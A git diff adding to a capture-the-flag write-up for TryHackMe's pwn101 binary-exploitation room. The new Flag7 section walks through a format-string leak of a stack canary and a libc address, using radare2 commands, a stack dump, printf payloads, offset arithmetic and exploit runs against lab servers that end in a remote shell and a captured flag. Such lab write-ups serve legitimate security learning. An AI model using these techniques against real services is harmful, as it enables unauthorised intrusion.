@@ -92,7 +92,7 @@ $
 
 ```
 ## Flag3
-Use gdb to reverse engineee `general` func using `disassemble general`  and remember `scanf` with option `%s` will cause some problem with our payload , if we read the assembly code we now buffer is 32 so we need more 8 byte to overwrite rbp and  6 byte to write to rip. This only to find offset not payload and after that we find `offset = 40`
+Use gdb to reverse engineer `general` func using `disassemble general`  and remember `scanf` with option `%s` will cause some problem with our payload , if we read the assembly code we now buffer is 32 so we need more 8 byte to overwrite rbp and  6 byte to write to rip. This only to find offset not payload and after that we find `offset = 40`
 
 ![img](CTF_img/THM_pwn101/1.png)
 
@@ -209,6 +209,111 @@ We use integer overflow with this challenge is int 32 with max value went perfor
 ## Flag6
 Use can read [doc](https://owasp.org/www-community/attacks/Format_string_attack) about how to fully exploit this vul but in this chall the hardest part is brute force stack data (flag from 6 to 11 pointer)and uncode it by unhex and reverse hex and get the flag [exploit](CTF_exploit/THM_pwn101/pwn106.py)
 ## Flag7
+We disassemble main and reverse engineer it we know program read 2 time and have prinf(buf) Format_string_attack  and the way it exacute is
+```asm
+read(0, rbp-0x40, 0x14) # read 0x14(20) bytes to buffer
+printf(buffer)
+read(0, rbp-0x20, 0x200)# # read 0x200(512) bytes to buffer
+
+0x000055555540099a <+8>:   mov    rax,QWORD PTR fs:0x28
+0x00005555554009a3 <+17>:  mov    QWORD PTR [rbp-0x8],rax
+expose canary address is  [rbp-0x8]
+```
+we will use prinf(buf) to expose libc and canary  address to craft exploit
+We have trick because offset dont change so we can use formula below to get the offset in server.
+```
+dynamic_libc - static_libc = base address(server)
+base address(server) + static_func = dynamic_func
+
+```
+So let find offset canary first in `r2` break at prinf(buf) some common command [radare2_cheatsheet](https://gist.github.com/williballenthin/6857590dab3e2a6559d7)
+
+```
+r2 ./pwm107
+aaa
+alf
+pdf @ main #list assembly of main
+---
+ 0x00000a36      e805fdffff     call sym.imp.printf         ; int printf(const char*format)
+---
+ood # run
+db  0x00000a36 # break
+```
+
+ Let see our stack
+ ```bash
+ pxr @ rsp
+0x7ffc0dff6e30 0x4141414141414141   AAAAAAAA @ rsp ascii ('A')
+0x7ffc0dff6e38 0x4141414141414141   AAAAAAAA ascii ('A')
+0x7ffc0dff6e40 0x0000000041414141   AAAA.... 1094795585 ascii ('A')
+0x7ffc0dff6e48 ..[ null bytes ]..   00000000
+0x7ffc0dff6e58 0x00007fe25dc1c030   0..].... /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 library R X 'push rbp' 'ld-linux-x86-64.so.2'
+0x7ffc0dff6e60 ..[ null bytes ]..   00000000
+0x7ffc0dff6e68 0xf080313bf0445500   .UD.;1.. --------> canary address [rbp-0x8]
+0x7ffc0dff6e70 0x0000000000000001   ........ @ rbp 1
+0x7ffc0dff6e78 0x00007fe25da12d68   h-.]....
+0x7ffc0dff6e80 0x00007ffc0dff6f70   po...... [stack] stack R W 0x7ffc0dff6f78
+0x7ffc0dff6e88 0x0000559479400992   ..@y.U.. /home/kali/pwn107-1644307530397.pwn107 .text main,main main program R X 'push rbp' 'pwn107-1644307530397.pwn107'
+
+ ```
+ And we see from first input of prinf in `0x7ffc0dff6e30` to canary took 7 line mean 7 pointer away in input buffer, so we have `canary = input+7`  the same with our static libc is 5 so address of it is `static_libc = input+4'.
+
+ Let leak address of input
+ ```bash
+ python pwn107.py REMOTE 10.10.247.157 9007
+ [*] '/home/kali/pwn107-1644307530397.pwn107'
+     Arch:       amd64-64-little
+     RELRO:      Full RELRO
+     Stack:      Canary found
+     NX:         NX enabled
+     PIE:        PIE enabled
+     Stripped:   No
+ [+] Opening connection to 10.10.247.157 on port 9007: Done
+ /usr/local/lib/python3.13/dist-packages/pwnlib/tubes/tube.py:932: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+   res = self.recvuntil(delim, timeout=timeout)
+ [*] Switching to interactive mode
+  Thanks, Happy hacking!!
+ Your current streak: AAA_0x2d_0x2d_0x702434255f414141 #payload +=b"AAA_%4$p_%5$p_%6$p"
+ \x92\x1e\x7f
+
+ [Few days latter.... a notification pops up]
+
+ Hi pwner 👾, keep hacking👩💻 - We miss you!😢
+ $
+```
+So input address is in `%6$p` so that we now address of canary and static_libc is `%13$p` and `%10$p`(this could change to or 10 in remote server)
+Using exploit [exploit](CTF_exploit/THM_pwn101/pwn107.py)
+
+```bash
+python pwn107.py REMOTE 10.10.123.26 9007
+[*] '/home/kali/pwn107.pwn107'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+[+] Opening connection to 10.10.123.26 on port 9007: Done
+[*] Loaded 14 cached gadgets for './pwn107.pwn107'
+[*] Switching to interactive mode
+
+
+[Few days latter.... a notification pops up]
+
+Hi pwner 👾, keep hacking👩💻 - We miss you!😢
+This your last streak back, don't do this mistake again
+$ id
+uid=1008(pwn107) gid=1008(pwn107) groups=1008(pwn107)
+$ cat flag.txt
+THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}
+$
+
+```
+
+
+
+
+
 ## Flag8
 ## Flag9
 ## Flag10
